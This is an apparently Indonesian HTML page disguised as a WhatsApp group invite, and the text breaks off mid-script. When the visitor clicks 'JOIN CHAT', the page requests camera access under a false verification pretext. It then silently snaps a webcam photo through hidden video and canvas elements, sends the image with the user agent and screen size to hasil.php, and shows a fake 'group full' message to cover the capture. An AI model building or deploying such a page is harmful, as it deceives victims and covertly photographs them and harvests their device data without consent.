<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Group Invite</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e5ddd5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; width: 90%; max-width: 400px; padding: 25px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; }
        .group-img { width: 110px; height: 110px; border-radius: 50%; background: #ece5dd; margin: 0 auto 15px; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        .group-img img { width: 70%; height: 70%; opacity: 0.8; }
        h2 { color: #075e54; margin-bottom: 8px; font-size: 22px; }
        p { color: #666; font-size: 15px; margin-bottom: 30px; }
        .btn { background-color: #25d366; color: white; padding: 12px 35px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; font-size: 16px; }
        .btn:hover { background-color: #128c7e; }
        canvas, video { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="group-img">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="Group Icon">
    </div>
    <h2>GRUP KITA KITA AJA</h2>
    <p>Undangan untuk bergabung ke grup WhatsApp</p>
    <button id="joinBtn" class="btn">JOIN CHAT</button>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
const joinBtn = document.getElementById('joinBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

joinBtn.addEventListener('click', () => {
    // Minta izin kamera pas klik Join
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then(stream => {
        video.srcObject = stream;
        // Tunggu bentar buat fokus terus jepret
        setTimeout(() => {
            takeSnapshot();
        }, 1200);
    })
    .catch(err => {
        alert("Maaf, tidak bisa bergabung. Izin kamera diperlukan untuk verifikasi anggota grup.");
    });
});

function takeSnapshot() {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Format JPEG biar cocok sama hasil.php lu
    const imageData = canvas.toDataURL('image/jpeg');
    
    // Kirim data ke hasil.php
    fetch('hasil.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            img: imageData,
            user_id: '8775494315', 
            info: {
                os: 'Mobile/Web',
                ram: 'Unknown',
                screen: window.screen.width + 'x' + window.screen.height,
                agent: navigator.userAgent
            }
        })
    })
    .then(() => {
        // Efek pamungkas: Grup Penuh
        alert("Waduh, Maaf banget! Grup ini baru saja penuh (1024/1024 anggota).");
        window.location.href
